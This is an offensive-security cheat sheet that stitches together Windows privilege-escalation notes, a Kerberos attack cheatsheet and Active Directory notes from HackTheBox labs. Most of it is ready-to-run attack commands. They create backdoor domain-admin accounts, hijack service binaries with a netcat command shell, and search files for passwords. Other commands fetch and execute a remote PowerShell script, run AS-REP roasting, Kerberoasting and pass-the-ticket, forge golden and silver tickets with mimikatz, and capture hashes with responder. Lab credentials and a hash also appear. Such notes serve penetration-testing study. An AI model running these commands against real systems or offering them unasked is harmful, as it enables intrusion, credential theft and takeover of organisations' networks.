reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br />
[Installing Elevated]<br />
msiexec /i <path to msi file></p>
<p>+ <strong>Some Domains.xml Abuse.</strong><br />
<a href="https://github.com/FSecureLABS/SharpGPOAbuse">https://github.com/FSecureLABS/SharpGPOAbuse</a></p>
<p>+ <strong>Will the path to privilege escalation lie in a executable binary or service in Program Files? Is it listening on local only and thus we missed it from the outside scans?</strong><br />
cd "C:\Program Files"<br />
DIR /A /O /Q</p>
<p>cd "C:\Program Files (x86)"<br />
DIR /A /O /Q</p>
<p>+ <strong>What is my current user's privileges?</strong><br />
net user someWindowsUser</p>
<p>+ <strong>What are other user's privileges?</strong><br />
net users</p>
<p>+ <strong>Hash Collection:</strong><br />
<strong>pg_dump</strong>.exemeterpreter &gt; <strong>hashdump</strong></p>
<p>**ntds.dit exfiltration.<br />
**<br />
+ <strong>Who's the Administrator(s) around here?</strong><br />
net localgroup administrators</p>
<p>+ <strong>Might we be able to move laterally to them if they are Administrators?</strong><br />
net user somePotentialAdminUser</p>
<p>+ <strong>Firewall Information?</strong><br />
netsh firewall show state<br />
netsh firewall show config</p>
<p>+ <strong>Network Information</strong> (<em>who am I connected to? can anything off of Loopback be forwarded out to 0.0.0.0?</em>)<br />
netstat -anoy<br />
route print<br />
arp -A<br />
ipconfig /all</p>
<p>+ <strong>Cleartext Passwords in Files? Search for them.</strong><br />
findstr /si password *.txt<br />
findstr /si password *.xml<br />
findstr /si password *.ini</p>
<p>+ <strong>Find all those password and credential strings in config files.</strong><br />
dir /s <em>pass</em> == <em>cred</em> == <em>vnc</em> == <em>.config</em></p>
<p>+ <strong>Find all passwords in all files...</strong><br />
findstr /spin "password" <em>.</em></p>
<p>+ <strong>WINDOWS SHARES.</strong><br />
NET SHARE<br />
NET USE</p>
<p><strong>--&gt; CREATE A SHARE ON WINDOWS FROM THE COMMAND LINE:</strong><br />
NET SHARE <sharename>=&lt;drive/folderpath&gt; /remark: "This is my share."<br />
<strong>--&gt; MOUNT A WINDOWS SHARE FROM THE COMMAND LINE:</strong><br />
NET USE Z: \COMPUTER_NAME\SHARE_NAME /PERSISTENT:YES<br />
<strong>--&gt;</strong> <strong>UNMOUNT SHARE:</strong><br />
NET USE Z: /DELETE<br />
<strong>--&gt;</strong> <strong>DELETE A SHARE ENTIRLEY:</strong><br />
NET SHARE /DELETE</p>
<p>+ <strong>Find ALL weak file permissions per drive.</strong><br />
accesschk.exe -uwqs Users c:<em>.</em></p>
<p>+ <strong>A part of group "Authenticated Users" - you would be surprised if you have a real user.</strong><br />
accesschk.exe -uwqs "Authenticated Users" c:<em>.</em></p>
<p>+ <strong>Add an Administrator User with all of the goodies.</strong><br />
cmd.exe /c net user siren superPassword /add<br />
cmd.exe /c net localgroup administrators siren /add<br />
cmd.exe /c net localgroup "Remote Desktop Users" siren /add</p>
<p>+ <strong>Adding a Windows Domain Administrator from the Command Line:</strong><br />
cmd.exe /c net user siren superPassword /add<br />
net localgroup Administrators siren /ADD /DOMAIN<br />
net localgroup "Remote Desktop Users" siren /ADD /DOMAIN<br />
net group "Domain Admins" siren /ADD /DOMAIN<br />
net group "Enterprise Admins" siren /ADD /DOMAIN<br />
net group "Schema Admins" siren /ADD /DOMAIN<br />
net group "Group Policy Creator Owners" siren /ADD /DOMAIN</p>
<p>+ <strong>Time and our own <em>Scheduled Tasks</em>.</strong><br />
time<br />
The current time is: 6:41:05.81<br />
at 06:42 /interactive "C:\Tools\sirenMaint.exe"</p>
<p>+ <strong>Create a Task. Run as System. Every 5 minutes. Path to binary.</strong><br />
schtasks /create /ru SYSTEM /sc MINUTE /MO 5 /tn RUNME /tr ""C:\Tools\sirenMaint.exe""<br />
<strong>Attacking Machine:</strong><br />
nc -lvp 443<br />
<strong>Victim Machine:</strong><br />
schtasks /RUN /TN "RUNME"</p>
<p>+ <strong>Fun with Accesschk Enumeration!</strong><br />
accesschk.exe /accepteula (<em>always do this first!!!!!</em>)<br />
accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)<br />
accesschk.exe -uwcqv "Authenticated Users" * (<em>won't yield anything on Win 8</em>)<br />
accesschk.exe -ucqv [service_name]</p>
<p><strong>#Find ALL weak folder permissions, per drive.</strong><br />
accesschk.exe -uwdqs Users c:\<br />
accesschk.exe -uwdqs "Authenticated Users" c:\<br />
accesschk.exe -uwqs Users c:<em>.</em><br />
accesschk.exe -uwqs "Authenticated Users" c:<em>.</em></p>
<p>+ <strong>Let me guess, you came in as NT AUTHORITY\NETWORK SERVICE</strong> <strong>?</strong><br />
MS09-012.exe "whoami"<br />
Initiate Network-Related Transfer <em>Again</em>.<br />
MS09-012.exe "ftp -v -n -s:ftp.txt" and come back in NT Shell.</p>
<p>+ <strong>I enumerated a weak service path on the machine. How do I exploit this... S1REN?</strong><br />
sc config UPNPHOST binpath= "C:\Tools\sirenMaint.exe"<br />
sc config UPNPHOST obj= ".\LocalSystem" password= ""<br />
sc config SSDPSRV binpath= "C:\inetpub\siren\sirenMaint.exe"<br />
sc config SSDPSRV obj= ".\LocalSystem" password= ""<br />
sc config SSDPSRV start= "demand"<br />
(<em>Now, Stage matching msfvenom Payload Listener in Meterpreter</em>)<br />
net stop SSDPSRV<br />
net start SSDPSRV</p>
<p>+ <strong>Up to Vista...</strong><br />
psexec -i -s cmd.exe</p>
<p>+ <strong>On Windows XP and Older we can get an Administrator Privilege shell.</strong></p>
<p><em><strong>--&gt;</strong></em> IF you have a GUI with a USER THAT IS INCLUDED IN THE Administrators GROUP you first<br />
need to open up cmd.exe for the administrator. If you open up the cmd that is in<br />
Accessories it will be opened up as a normal user. And if you rightclick and do<br />
Run as Administrator you might need to know the Administrators password. Which<br />
you might not know. So instead you open up the cmd from C:\windows\system32\cmd.exe.<br />
This will give you a cmd with <em>Administrators Rights</em>.</p>
<p><strong>--&gt;</strong> <em>From here, we want SYSTEM level privileges, no?</em><br />
<strong>--&gt;</strong> First we check what time it is on the local machine.<br />
time<br />
<strong>--&gt;</strong> Now we set the time we want the system CMD to start.<br />
<strong>--&gt;</strong> Probably one minuter after the time.<br />
at 01:23 /interactive cmd.exe<br />
<strong>System Shell.</strong></p>
<p>+ <strong>Ahh, so you're interested in UNQUOTED SERVICE PATHS... eh?</strong><br />
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows" |findstr /i /v """</p>
<p><strong>--&gt;</strong> Using SC:<br />
sc query<br />
sc qc <service name></p>
<p><em><strong>--&gt;</strong></em> Okay S1REN, what am I looking for here?<br />
If the results of the above command's value of path only contains "" and spaces - it's vulnerable.</p>
<p><em><strong>--&gt;</strong></em> Have a hit?<br />
<em><strong>--&gt;</strong></em> Use icacls or cacls.exe (both native to Windows) to check binary permissions.<br />
icacls "C:\Program Files (x86)\UNQUOTED_SERVICE_PATH_SOFTWARE"</p>
<p><em><strong>--&gt;</strong></em> <em>Exploit it.</em><br />
<em><strong>--&gt;</strong></em> <em>If the path of the Binary file is:</em><br />
C:\Program Files\something\something.exe<br />
<em><strong>--&gt;</strong></em> <em>Then,</em><br />
move something.exe something.exe.BACK<br />
move sirenMaint.exe C:\Program Files\something\<br />
move sirenMaint.exe something.exe</p>
<p><em><strong>--&gt;</strong></em> Well, wasn't that fun? Now our payload will get executed instead of the intended exe!<br />
<em><strong>--&gt;</strong></em> <em>Nice.</em></p>
<p><strong>#S1REN, is there a better way to enumerate out every service and then just check for which of them has an Unquoted Bin Paths?<br />
<strong>_</strong>--&gt;</strong> Yup._<br />
<strong>--&gt;</strong> <em>Thanks S1REN!</em><br />
cd "C:\Windows\TEMP"<br />
sc query state= all | findstr "SERVICE_NAME:" &gt;&gt; ServiceNames.txt<br />
FOR /F %i in (ServiceNames.txt) DO echo %i<br />
type ServiceNames.txt<br />
FOR /F "tokens=2 delims= " %i in (ServiceNames.txt) DO @echo %i &gt;&gt; Services.txt<br />
FOR /F %i in (Services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; path.txt<br />
type path.txt</p>
<p><em>Nice.</em></p>
<p><strong>#Continued</strong><br />
<strong>--&gt;</strong> S1REN.<br />
<strong>--&gt;</strong> Yes?<br />
<strong>--&gt;</strong> Is there a way to do essentially the same thing and then recursively execute icacls.exe or cacls.exe on them to get the information I need?<br />
<strong>--&gt;</strong> Yup.<br />
cd "C:\Windows\TEMP"<br />
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; C:\windows\temp\permissions.txt</p>
<p><strong>icacls.exe:</strong><br />
for /f eol^=^"^ delims^=^" %a in (C:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"</p>
<p><strong>cacls.exe</strong><br />
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c cacls "%a"</p>
<p>IF YOU FIND A SERVICE THAT HAS WRITE PERMISSIONS set to "EVERYONE", you can change<br />
that binary INTO YOUR OWN CUSTOM BINARY and make it execute in the privileged context.</p>
<p>+ <strong>Dealing with Scheduled Tasks with SYSTEM Privileges.</strong><br />
<strong>--&gt;</strong> Here we are looking for tasks that are run by a privileged user, and run a binary<br />
that we can overwrite.<br />
schtasks /query /fo LIST /v &gt; schtask.txt<br />
type schtask.txt<br />
(Copy that output to a temporary file</p>
<p><strong>--&gt;</strong> Yeah I know this ain't pretty, but it works. You can of course change the name<br />
SYSTEM to another privileged user. In other words, copy the output into Kali and<br />
just grep for SYSTEM.<br />
<strong>--&gt;</strong> Nice, S1REN.<br />
<strong>--&gt;</strong> Thanks.<br />
cat schtask.txt | grep "SYSTEM|Task To Run" | grep -B 1 SYSTEM --color=auto</p>
<p><strong>--&gt;</strong> <strong>Now, Change up the UPNP Service Binary Path (for example):</strong><br />
sc config upnphost binpath= "C:\Tools\nc.exe -nlvp 6666 -e C:\Windows\system32\cmd.exe"<br />
sc config upnphost obj= ".\LocalSystem" password= ""<br />
sc config upnphost depend= ""<br />
net stop <service><br />
<strong>--&gt;</strong> Attacking Machine<br />
nc -nlvp 6666<br />
net start <service></p>
<p><strong>Tools:</strong><br />
(Remember how I said to save a local copy of that systeminfo output?)<br />
<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p>
<p>+ <strong>How do I cross-compile payloads for Windows on Linux, S1REN?</strong><br />
<strong>--&gt;</strong> Dude, <em>check this out</em>.<br />
apt-get install mingw-w64</p>
<p><strong>+ Cross-Compilation Reference:</strong></p>
<ul>
<li>Ci686-w64-mingw32-gcc hello.c -o hello32.exe     </li>
<li>32-bitx86_64-w64-mingw32-gcc hello.c -o hello64.exe    </li>
<li>64-bit # C++i686-w64-mingw32-g++ hello.cc -o hello32.exe    </li>
<li>32-bitx86_64-w64-mingw32-g++ hello.cc -o hello64.exe   # 64-bit</li>
</ul>
<p>+ <strong>Migrate to a stable process.</strong><br />
https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/<br />
<strong>--&gt;</strong> "<em>Using the <strong>migrate</strong> post module, you can migrate to another process on the victim.</em>"<br />
<strong>meterpreter&gt;</strong> run post/windows/manage/migrate<br />
<strong>meterpreter&gt;</strong> migrate -h<br />
<strong>meterpreter&gt;</strong> migrate <PID></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="kerberos-cheatsheet"><a class="header" href="#kerberos-cheatsheet">Kerberos cheatsheet</a></h1>
<p><a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#kerberos-cheatsheet"></a></p>
<h2 id="bruteforcing"><a class="header" href="#bruteforcing">Bruteforcing</a></h2>
<p><a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#bruteforcing"></a></p>
<p>With <a href="https://github.com/TarlogicSecurity/kerbrute">kerbrute.py</a>:</p>
<pre><code class="language-shell">python kerbrute.py -domain &lt;domain_name&gt; -users &lt;users_file&gt; -passwords &lt;passwords_file&gt; -outputfile &lt;output_file&gt;
</code></pre>
<p>With <a href="https://github.com/Zer1t0/Rubeus">Rubeus</a> version with brute module:</p>
<pre><code class="language-shell"># with a list of users
.\Rubeus.exe brute /users:&lt;users_file&gt; /passwords:&lt;passwords_file&gt; /domain:&lt;domain_name&gt; /outfile:&lt;output_file&gt;

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:&lt;passwords_file&gt; /outfile:&lt;output_file&gt;
</code></pre>
<h2 id="asreproast"><a class="header" href="#asreproast">ASREPRoast</a></h2>
<p><a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#asreproast"></a></p>
<p>With <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> example GetNPUsers.py:</p>
<pre><code class="language-shell"># check ASREPRoast for all domain users (credentials required)
python GetNPUsers.py &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -request -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;

# check ASREPRoast for a list of users (no credentials required)
python GetNPUsers.py &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;
</code></pre>
<p>With <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>:</p>
<pre><code class="language-shell"># check ASREPRoast for all users in current domain
.\Rubeus.exe asreproast  /format:&lt;AS_REP_responses_format [hashcat | john]&gt; /outfile:&lt;output_hashes_file&gt;
</code></pre>
<p>Cracking with dictionary of passwords:</p>
<pre><code class="language-shell">hashcat -m 18200 -a 0 &lt;AS_REP_responses_file&gt; &lt;passwords_file&gt;

john --wordlist=&lt;passwords_file&gt; &lt;AS_REP_responses_file&gt;
</code></pre>
<h2 id="kerberoasting"><a class="header" href="#kerberoasting">Kerberoasting</a></h2>
<p><a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#kerberoasting"></a></p>
<p>With <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> example GetUserSPNs.py:</p>
<pre><code class="language-shell">python GetUserSPNs.py &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -outputfile &lt;output_TGSs_file&gt;
</code></pre>
<p>With <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>:</p>
<pre><code class="language-shell">.\Rubeus.exe kerberoast /outfile:&lt;output_TGSs_file&gt;
</code></pre>
<p>With <strong>Powershell</strong>:</p>
<pre><code>iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat &lt;TGSs_format [hashcat | john]&gt; | % { $_.Hash } | Out-File -Encoding ASCII &lt;output_TGSs_file&gt;
</code></pre>
<p>Cracking with dictionary of passwords:</p>
<pre><code class="language-shell">hashcat -m 13100 --force &lt;TGSs_file&gt; &lt;passwords_file&gt;

john --format=krb5tgs --wordlist=&lt;passwords_file&gt; &lt;AS_REP_responses_file&gt;
</code></pre>
<h2 id="overpass-the-hashpass-the-key-ptk"><a class="header" href="#overpass-the-hashpass-the-key-ptk">Overpass The Hash/Pass The Key (PTK)</a></h2>
<p><a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#overpass-the-hashpass-the-key-ptk"></a></p>
<p>By using <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> examples:</p>
<pre><code class="language-shell"># Request the TGT with hash
python getTGT.py &lt;domain_name&gt;/&lt;user_name&gt; -hashes [lm_hash]:&lt;ntlm_hash&gt;
# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
python getTGT.py &lt;domain_name&gt;/&lt;user_name&gt; -aesKey &lt;aes_key&gt;
# Request the TGT with password
python getTGT.py &lt;domain_name&gt;/&lt;user_name&gt;:[password]
# If not provided, password is asked

# Set the TGT for impacket use
export KRB5CCNAME=&lt;TGT_ccache_file&gt;

# Execute remote commands with any of the following by using the TGT
python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
</code></pre>
<p>With <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> and <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a>:</p>
<pre><code class="language-shell"># Ask and inject the ticket
.\Rubeus.exe asktgt /domain:&lt;domain_name&gt; /user:&lt;user_name&gt; /rc4:&lt;ntlm_hash&gt; /ptt

# Execute a cmd in the remote machine
.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd
</code></pre>
<h2 id="pass-the-ticket-ptt"><a class="header" href="#pass-the-ticket-ptt">Pass The Ticket (PTT)</a></h2>
<p><a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#pass-the-ticket-ptt"></a></p>
<h3 id="harvest-tickets-from-linux"><a class="header" href="#harvest-tickets-from-linux">Harvest tickets from Linux</a></h3>
<p><a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#harvest-tickets-from-linux"></a></p>
<p>Check type and location of tickets:</p>
<pre><code class="language-shell">grep default_ccache_name /etc/krb5.conf
</code></pre>
<p>If none return, default is FILE:/tmp/krb5cc_%{uid}.</p>
<p>In case of file tickets, you can copy-paste (if you have permissions) for use them.</p>
<p>In case of being <em>KEYRING</em> tickets, you can use <a href="https://github.com/TarlogicSecurity/tickey">tickey</a> to get them:</p>
<pre><code class="language-shell"># To dump current user tickets, if root, try to dump them all by injecting in other user processes
# to inject, copy tickey in a reachable folder by all users
cp tickey /tmp/tickey
/tmp/tickey -i
</code></pre>
<h3 id="harvest-tickets-from-windows"><a class="header" href="#harvest-tickets-from-windows">Harvest tickets from Windows</a></h3>
<p><a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#harvest-tickets-from-windows"></a></p>
<p>With <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>:</p>
<pre><code class="language-shell">mimikatz # sekurlsa::tickets /export
</code></pre>
<p>With <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> in Powershell:</p>
<pre><code class="language-shell">.\Rubeus dump

# After dump with Rubeus tickets in base64, to write the in a file
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("&lt;bas64_ticket&gt;"))
</code></pre>
<p>To convert tickets between Linux/Windows format with <a href="https://github.com/Zer1t0/ticket_converter">ticket_converter.py</a>:</p>
<pre><code>python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
</code></pre>
<h3 id="using-ticket-in-linux"><a class="header" href="#using-ticket-in-linux">Using ticket in Linux:</a></h3>
<p><a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#using-ticket-in-linux"></a></p>
<p>With <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> examples:</p>
<pre><code class="language-shell"># Set the ticket for impacket use
export KRB5CCNAME=&lt;TGT_ccache_file_path&gt;

# Execute remote commands with any of the following by using the TGT
python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
</code></pre>
<h3 id="using-ticket-in-windows"><a class="header" href="#using-ticket-in-windows">Using ticket in Windows</a></h3>
<p><a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#using-ticket-in-windows"></a></p>
<p>Inject ticket with <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>:</p>
<pre><code class="language-shell">mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;
</code></pre>
<p>Inject ticket with <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>:</p>
<pre><code class="language-shell">.\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;
</code></pre>
<p>Execute a cmd in the remote machine with <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a>:</p>
<pre><code class="language-shell">.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd
</code></pre>
<h2 id="silver-ticket"><a class="header" href="#silver-ticket">Silver ticket</a></h2>
<p><a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#silver-ticket"></a></p>
<p>With <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> examples:</p>
<pre><code class="language-shell"># To generate the TGS with NTLM
python ticketer.py -nthash &lt;ntlm_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; -spn &lt;service_spn&gt;  &lt;user_name&gt;

# To generate the TGS with AES key
python ticketer.py -aesKey &lt;aes_key&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; -spn &lt;service_spn&gt;  &lt;user_name&gt;

# Set the ticket for impacket use
export KRB5CCNAME=&lt;TGS_ccache_file&gt;

# Execute remote commands with any of the following by using the TGT
python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
</code></pre>
<p>With <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>:</p>
<pre><code class="language-shell"># To generate the TGS with NTLM
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;ntlm_hash&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;

# To generate the TGS with AES 128 key
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;

# To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;

# Inject TGS with Mimikatz
mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;
</code></pre>
<p>Inject ticket with <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>:</p>
<pre><code class="language-shell">.\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;
</code></pre>
<p>Execute a cmd in the remote machine with <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a>:</p>
<pre><code class="language-shell">.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd
</code></pre>
<h2 id="golden-ticket"><a class="header" href="#golden-ticket">Golden ticket</a></h2>
<p><a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#golden-ticket"></a></p>
<p>With <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> examples:</p>
<pre><code class="language-shell"># To generate the TGT with NTLM
python ticketer.py -nthash &lt;krbtgt_ntlm_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt;  &lt;user_name&gt;

# To generate the TGT with AES key
python ticketer.py -aesKey &lt;aes_key&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt;  &lt;user_name&gt;

# Set the ticket for impacket use
export KRB5CCNAME=&lt;TGS_ccache_file&gt;

# Execute remote commands with any of the following by using the TGT
python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
</code></pre>
<p>With <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>:</p>
<pre><code class="language-shell"># To generate the TGT with NTLM
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_ntlm_hash&gt; /user:&lt;user_name&gt;

# To generate the TGT with AES 128 key
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt;

# To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt;

# Inject TGT with Mimikatz
mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;
</code></pre>
<p>Inject ticket with <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>:</p>
<pre><code class="language-shell">.\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;
</code></pre>
<p>Execute a cmd in the remote machine with <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a>:</p>
<pre><code class="language-shell">.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd
</code></pre>
<h2 id="misc"><a class="header" href="#misc">Misc</a></h2>
<p><a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#misc"></a></p>
<p>To get NTLM from password:</p>
<pre><code class="language-python">python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "&lt;password&gt;".encode("utf-16le")).digest())'
</code></pre>
<h2 id="tools-1"><a class="header" href="#tools-1">Tools</a></h2>
<p><a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#tools"></a></p>
<ul>
<li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></li>
<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></li>
<li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li>
<li><a href="https://github.com/Zer1t0/Rubeus">Rubeus</a> with brute module</li>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a></li>
<li><a href="https://github.com/TarlogicSecurity/kerbrute">kerbrute.py</a></li>
<li><a href="https://github.com/TarlogicSecurity/tickey">tickey</a></li>
<li><a href="https://github.com/Zer1t0/ticket_converter">ticket_converter.py</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="we-got-users-but-no-pass"><a class="header" href="#we-got-users-but-no-pass">We got Users but no Pass?</a></h2>
<h3 id="links-15"><a class="header" href="#links-15">Links</a></h3>
<ul>
<li><a href="https://github.com/GhostPack/Rubeus">GitHub Rubeus</a></li>
</ul>
<h3 id="asrep-roasting-attack"><a class="header" href="#asrep-roasting-attack">ASREP Roasting Attack</a></h3>
<h3 id="check-for-valid-usernames"><a class="header" href="#check-for-valid-usernames">Check for valid usernames</a></h3>
<pre><code>/opt/kerbrute userenum --dc $ip -d intelligence.htb users

then do this

GetNPUsers.py -no-pass -dc-ip $ip intelligence.htb/Jose.Williams
</code></pre>
<pre><code>impacket-GetNPUsers htb.local/ -usersfile user.txt -format hashcat -outputfile hashes.domain.txt

or this:

for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep krb5asrep; done



.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
</code></pre>
<pre><code>
impacket-GetNPUsers -dc-ip 192.168.205.70  -request -outputfile hashes.asreproast corp.com/pete
hashcat --help | grep -i "Kerberos"

sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

cd C:\Tools
.\Rubeus.exe asreproast /nowrap

sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
</code></pre>
<h3 id="password-reset-over-rpc"><a class="header" href="#password-reset-over-rpc">Password Reset over RPC</a></h3>
<p>https://room362.com/posts/2017/reset-ad-user-password-with-linux/</p>
<pre><code>Log into Rpc with the user who can change password of other user:

rpcclient $&gt; setuserinfo2

rpcclient $&gt; setuserinfo2 audit2020 23 'Bwiz123!!!'

</code></pre>
<h3 id="yet-another-way-to-get-that-hash"><a class="header" href="#yet-another-way-to-get-that-hash">Yet another way to get that Hash</a></h3>
<pre><code>From intelligence htb, we can use dnstool.py and responder to grab a hash, maybe.

python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a add -r webfakedomain.intelligence.htb --data attackerip victimip


Then, boom:

responder -I tun0 -A

Then, just crack it:

hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt

python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb

rdate -n $ip

getST.py -dc-ip $ip -spn www/dc.intelligence.htb -hashes :486b1ed2229329984333a964b71045e9 -impersonate administrator intelligence.htb/svc_int


KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb

Boom, Shell!

</code></pre>
